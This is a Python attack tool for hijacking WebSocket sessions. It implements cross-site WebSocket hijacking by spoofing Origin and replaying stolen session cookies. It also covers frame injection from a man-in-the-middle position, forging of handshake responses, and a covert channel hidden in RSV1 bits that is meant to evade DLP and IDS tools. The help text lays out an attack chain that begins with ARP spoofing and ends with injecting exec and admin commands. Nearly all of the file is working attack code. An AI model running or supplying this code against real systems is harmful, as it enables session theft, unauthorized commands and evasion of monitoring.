#!/usr/bin/env python3
"""
WebSocket Hijacking - ClaudeCodeIPTool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

WebSocket session hijacking, CSWSH, frame injection, and Origin spoofing.

Techniques (from O'Reilly WebSocket book):
1. Cross-Site WebSocket Hijacking (CSWSH) - no CORS enforcement on WS
2. Origin header spoofing - servers often don't validate Origin outside browser
3. Frame injection - craft/inject frames into existing sessions
4. Handshake replay - forge Sec-WebSocket-Accept for MitM positioning
5. Covert channel via RSV bits - DLP/IDS blind to reserved frame bits

Attack flow:
  ARP spoof (arp-spoof.py) → intercept HTTP traffic → catch WS upgrade →
  replay/hijack session → inject frames → exfiltrate

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import argparse
import hashlib
import base64
import struct
import os
import sys
import socket
import ssl
import threading
import re
from urllib.parse import urlparse

try:
    import websocket
    WS_LIB = True
except ImportError:
    WS_LIB = False


# ─── Frame Primitives ────────────────────────────────────────────────────────

def ws_accept_token(key: str) -> str:
    """
    Compute Sec-WebSocket-Accept from Sec-WebSocket-Key.

    RFC 6455: SHA1(key + GUID) → base64
    Used to forge or validate upgrade responses.
    """
    GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    digest = hashlib.sha1((key + GUID).encode("ascii")).digest()
    return base64.b64encode(digest).decode()


def build_frame(payload: bytes, opcode: int = 0x01, mask: bool = True,
                rsv1: bool = False, fin: bool = True) -> bytes:
    """
    Build a WebSocket frame.

    Frame layout (RFC 6455):
      Byte 0: FIN(1) RSV1(1) RSV2(1) RSV3(1) OPCODE(4)
      Byte 1: MASK(1) PAYLOAD_LEN(7)
      [2-3 or 2-9]: extended length if needed
      [4 bytes]: masking key (if MASK=1)
      [N bytes]: masked/raw payload

    Opcodes: 0x01=text, 0x02=binary, 0x08=close, 0x09=ping, 0x0a=pong
    """
    frame = bytearray()

    first = 0x00
    if fin:
        first |= 0x80         # FIN bit
    if rsv1:
        first |= 0x40         # RSV1 - covert channel, ignored by most parsers
    first |= (opcode & 0x0f)
    frame.append(first)

    plen = len(payload)
    mask_bit = 0x80 if mask else 0x00

    if plen < 126:
        frame.append(mask_bit | plen)
    elif plen < 65536:
        frame.append(mask_bit | 126)
        frame.extend(struct.pack(">H", plen))
    else:
        frame.append(mask_bit | 127)
        frame.extend(struct.pack(">Q", plen))

    if mask:
        masking_key = os.urandom(4)
        frame.extend(masking_key)
        frame.extend(bytes(payload[i] ^ masking_key[i % 4] for i in range(plen)))
    else:
        frame.extend(payload)

    return bytes(frame)


def unmask_frame(mask: bytes, data: bytes) -> bytes:
    """Unmask a client-to-server frame payload."""
    return bytes(data[i] ^ mask[i % 4] for i in range(len(data)))


def parse_frame(data: bytes) -> dict:
    """Parse a raw WebSocket frame into fields."""
    if len(data) < 2:
        return {}

    byte0, byte1 = data[0], data[1]
    fin    = bool(byte0 & 0x80)
    rsv1   = bool(byte0 & 0x40)
    opcode = byte0 & 0x0f
    masked = bool(byte1 & 0x80)
    plen   = byte1 & 0x7f

    offset = 2
    if plen == 126:
        plen = struct.unpack(">H", data[2:4])[0]
        offset = 4
    elif plen == 127:
        plen = struct.unpack(">Q", data[2:10])[0]
        offset = 10

    mask_key = None
    if masked:
        mask_key = data[offset:offset+4]
        offset += 4

    payload_raw = data[offset:offset+plen]
    payload = unmask_frame(mask_key, payload_raw) if masked else payload_raw

    return {
        'fin': fin, 'rsv1': rsv1, 'opcode': opcode,
        'masked': masked, 'mask_key': mask_key,
        'payload': payload, 'total_len': offset + plen
    }


def build_close_frame(code: int = 1000) -> bytes:
    return build_frame(struct.pack(">H", code), opcode=0x08)


def build_ping() -> bytes:
    return build_frame(b"ping", opcode=0x09)


# ─── CSWSH (Cross-Site WebSocket Hijacking) ──────────────────────────────────

class CSWSHProbe:
    """
    Cross-Site WebSocket Hijacking probe.

    Exploits: WebSocket has no SOP/CORS enforcement. Browser sends session
    cookies automatically on WS upgrade GET. Origin header is browser-set
    and controllable from scripts.

    From non-browser context: set Origin to whatever server expects.
    """

    def __init__(self, target_url: str, cookies: str = None,
                 origin: str = None, verbose: bool = False):
        self.target_url = target_url
        self.cookies = cookies
        self.verbose = verbose

        parsed = urlparse(target_url)
        # Spoof Origin as same origin if not specified
        scheme = "https" if parsed.scheme == "wss" else "http"
        self.origin = origin or f"{scheme}://{parsed.netloc}"

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["HIT", "DATA"]:
            prefix = {"HIT": "[💀]", "DATA": "[+]", "INFO": "[*]"}.get(level, "[ ]")
            print(f"{prefix} {msg}")

    def probe(self, send_payload: bytes = None) -> list:
        """
        Connect to WS target with spoofed Origin and optional session cookies.

        Returns list of messages received (server-to-client frames).
        """
        if not WS_LIB:
            print("[-] Install websocket-client: pip install websocket-client")
            return []

        headers = {
            "Origin": self.origin,
        }
        if self.cookies:
            headers["Cookie"] = self.cookies

        self.log(f"Connecting to {self.target_url}", "INFO")
        self.log(f"Spoofed Origin: {self.origin}", "INFO")
        if self.cookies:
            self.log(f"Cookies: {self.cookies[:60]}...", "INFO")

        messages = []

        try:
            ws = websocket.create_connection(
                self.target_url,
                header=headers,
                timeout=5,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            self.log("WS connection established (CSWSH succeeded)", "HIT")

            if send_payload:
                ws.send(send_payload)
                self.log(f"Sent payload: {send_payload[:80]}", "INFO")

            # Drain messages
            ws.settimeout(3)
            try:
                while True:
                    msg = ws.recv()
                    messages.append(msg)
                    self.log(f"Received: {str(msg)[:120]}", "DATA")
            except Exception:
                pass

            ws.close()

        except Exception as e:
            self.log(f"Connection failed: {e}", "INFO")

        return messages


# ─── Frame Injector ───────────────────────────────────────────────────────────

class WSFrameInjector:
    """
    Inject frames into a WebSocket connection via raw TCP.

    Requires ARP spoofing to be active (MitM position).
    Intercepts WS upgrade from MITM'd traffic, then injects frames.

    Note: Server-to-client frames have NO mask. Client-to-server frames
    must be masked. Injecting from MitM position in either direction.
    """

    def __init__(self, target_host: str, target_port: int,
                 use_tls: bool = False, verbose: bool = False):
        self.target_host = target_host
        self.target_port = target_port
        self.use_tls = use_tls
        self.verbose = verbose
        self.sock = None

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["INJ", "RECV"]:
            prefix = {"INJ": "[→]", "RECV": "[←]", "INFO": "[*]"}.get(level, "[ ]")
            print(f"{prefix} {msg}")

    def connect(self, path: str = "/", cookies: str = None,
                origin: str = None, subprotocol: str = None) -> bool:
        """Perform WS handshake and hold raw socket for frame injection."""
        raw = socket.create_connection((self.target_host, self.target_port), timeout=10)

        if self.use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.sock = ctx.wrap_socket(raw, server_hostname=self.target_host)
        else:
            self.sock = raw

        # Generate nonce
        nonce = base64.b64encode(os.urandom(16)).decode()
        expected_accept = ws_accept_token(nonce)

        # Build HTTP upgrade request
        headers = [
            f"GET {path} HTTP/1.1",
            f"Host: {self.target_host}:{self.target_port}",
            "Upgrade: websocket",
            "Connection: Upgrade",
            f"Sec-WebSocket-Key: {nonce}",
            "Sec-WebSocket-Version: 13",
        ]
        if origin:
            headers.append(f"Origin: {origin}")
        if cookies:
            headers.append(f"Cookie: {cookies}")
        if subprotocol:
            headers.append(f"Sec-WebSocket-Protocol: {subprotocol}")

        request = "\r\n".join(headers) + "\r\n\r\n"
        self.sock.sendall(request.encode())

        # Read response
        response = b""
        while b"\r\n\r\n" not in response:
            response += self.sock.recv(4096)

        if b"101" not in response:
            self.log(f"Upgrade failed: {response[:200]}", "INFO")
            return False

        # Validate accept token
        match = re.search(rb"Sec-WebSocket-Accept: ([^\r\n]+)", response)
        if match:
            server_accept = match.group(1).decode().strip()
            if server_accept != expected_accept:
                self.log("Accept token mismatch - MitM detected or server bug", "INFO")
                return False

        self.log(f"Handshake complete on {self.target_host}:{self.target_port}{path}", "INFO")
        return True

    def send_text(self, text: str):
        """Send a text frame (client-to-server, masked)."""
        frame = build_frame(text.encode(), opcode=0x01, mask=True)
        self.sock.sendall(frame)
        self.log(f"Injected text: {text[:80]}", "INJ")

    def send_binary(self, data: bytes):
        """Send a binary frame."""
        frame = build_frame(data, opcode=0x02, mask=True)
        self.sock.sendall(frame)
        self.log(f"Injected binary: {len(data)} bytes", "INJ")

    def send_covert(self, payload: bytes, visible_payload: bytes = b"ping"):
        """
        Covert channel via RSV1 bit.

        RSV1 is ignored by most parsers/DLP tools.
        Payload hidden in RSV1-flagged frame.
        """
        frame = build_frame(visible_payload + payload, opcode=0x02,
                            mask=True, rsv1=True)
        self.sock.sendall(frame)
        self.log(f"Sent covert frame ({len(payload)}b hidden in RSV1 frame)", "INJ")

    def recv_frame(self, timeout: float = 3.0) -> dict:
        """Receive and parse one frame."""
        self.sock.settimeout(timeout)
        try:
            raw = self.sock.recv(65536)
            frame = parse_frame(raw)
            if frame and self.verbose:
                op_names = {1: "text", 2: "binary", 8: "close", 9: "ping", 10: "pong"}
                op = op_names.get(frame['opcode'], f"0x{frame['opcode']:02x}")
                self.log(f"Received [{op}]: {frame['payload'][:80]}", "RECV")
            return frame
        except socket.timeout:
            return {}

    def close(self):
        if self.sock:
            try:
                self.sock.sendall(build_close_frame())
            except Exception:
                pass
            self.sock.close()


# ─── Handshake Forger ─────────────────────────────────────────────────────────

def forge_upgrade_response(key: str, subprotocol: str = None) -> bytes:
    """
    Forge a WS upgrade response (101 Switching Protocols).

    Use when MitM-positioned to intercept client upgrade and respond as server.
    """
    accept = ws_accept_token(key)
    lines = [
        "HTTP/1.1 101 Switching Protocols",
        "Connection: Upgrade",
        "Upgrade: websocket",
        f"Sec-WebSocket-Accept: {accept}",
    ]
    if subprotocol:
        lines.append(f"Sec-WebSocket-Protocol: {subprotocol}")
    lines.append("\r\n")
    return "\r\n".join(lines).encode()


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="WebSocket Hijacking - CSWSH, frame injection, Origin spoofing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  cswsh    - Cross-site WebSocket hijacking (Origin spoofing + cookie replay)
  inject   - Connect and inject arbitrary frames
  forge    - Compute/forge Sec-WebSocket-Accept token

Examples:
  # CSWSH probe with session cookies
  python3 ws-hijack.py cswsh wss://target.com/ws --cookies "session=abc123" -v

  # CSWSH with spoofed origin (override same-origin check)
  python3 ws-hijack.py cswsh wss://target.com/ws --origin https://trusted.com -v

  # Inject text frame into active WS session
  python3 ws-hijack.py inject target.com 443 --tls --path /ws --payload '{"action":"admin"}' -v

  # Forge accept token (for MitM handshake)
  python3 ws-hijack.py forge --key dGhlIHNhbXBsZSBub25jZQ==

Attack Chain:
  1. ARP spoof target:
     sudo python3 arp-spoof.py spoof <target> --spoof-ip <gateway> --intercept

  2. Intercept WS upgrade in traffic (mitm-suite.py catches headers)

  3. Replay session with CSWSH:
     python3 ws-hijack.py cswsh wss://victim.com/ws --cookies "<captured>" -v

  4. Or inject frames directly:
     python3 ws-hijack.py inject victim.com 443 --tls --payload '{"cmd":"exec"}'

Key Weaknesses Exploited:
  - WebSocket has NO CORS enforcement (browser sends cookies automatically)
  - Origin header is not validated by most servers
  - Frame masking uses XOR with disclosed key (not encryption)
  - RSV bits ignored by DLP/IDS tools (covert channel)
  - No built-in auth in WS protocol - relies entirely on HTTP layer

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
        """
    )

    subparsers = parser.add_subparsers(dest="mode")

    # CSWSH
    cswsh = subparsers.add_parser("cswsh", help="Cross-site WebSocket hijacking")
    cswsh.add_argument("url", help="WebSocket URL (ws:// or wss://)")
    cswsh.add_argument("--cookies", help="Session cookies to replay")
    cswsh.add_argument("--origin", help="Spoofed Origin header")
    cswsh.add_argument("--payload", help="Message to send after connecting")
    cswsh.add_argument("-v", "--verbose", action="store_true")

    # Inject
    inj = subparsers.add_parser("inject", help="Connect and inject frames")
    inj.add_argument("host", help="Target hostname")
    inj.add_argument("port", type=int, help="Target port")
    inj.add_argument("--tls", action="store_true", help="Use TLS (wss://)")
    inj.add_argument("--path", default="/", help="WebSocket path")
    inj.add_argument("--cookies", help="Session cookies")
    inj.add_argument("--origin", help="Spoofed origin")
    inj.add_argument("--payload", required=True, help="Text payload to inject")
    inj.add_argument("--covert", action="store_true", help="Use RSV1 covert channel")
    inj.add_argument("-v", "--verbose", action="store_true")

    # Forge
    frg = subparsers.add_parser("forge", help="Forge Sec-WebSocket-Accept")
    frg.add_argument("--key", required=True, help="Sec-WebSocket-Key from client")

    args = parser.parse_args()

    if args.mode == "cswsh":
        probe = CSWSHProbe(args.url, args.cookies, args.origin, args.verbose)
        payload = args.payload.encode() if args.payload else None
        msgs = probe.probe(payload)
        if msgs:
            print(f"\n[+] Received {len(msgs)} messages:")
            for m in msgs:
                print(f"    {str(m)[:200]}")
        else:
            print("[-] No messages received")

    elif args.mode == "inject":
        inj_client = WSFrameInjector(args.host, args.port, args.tls, args.verbose)
        origin = args.origin or f"{'https' if args.tls else 'http'}://{args.host}"

        if inj_client.connect(args.path, args.cookies, origin):
            if args.covert:
                inj_client.send_covert(args.payload.encode())
            else:
                inj_client.send_text(args.payload)

            frame = inj_client.recv_frame()
            if frame.get("payload"):
                print(f"[+] Response: {frame['payload'][:200]}")

            inj_client.close()

    elif args.mode == "forge":
        accept = ws_accept_token(args.key)
        print(f"Sec-WebSocket-Key:    {args.key}")
        print(f"Sec-WebSocket-Accept: {accept}")
        print()
        print("Forge response:")
        print(forge_upgrade_response(args.key).decode())

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
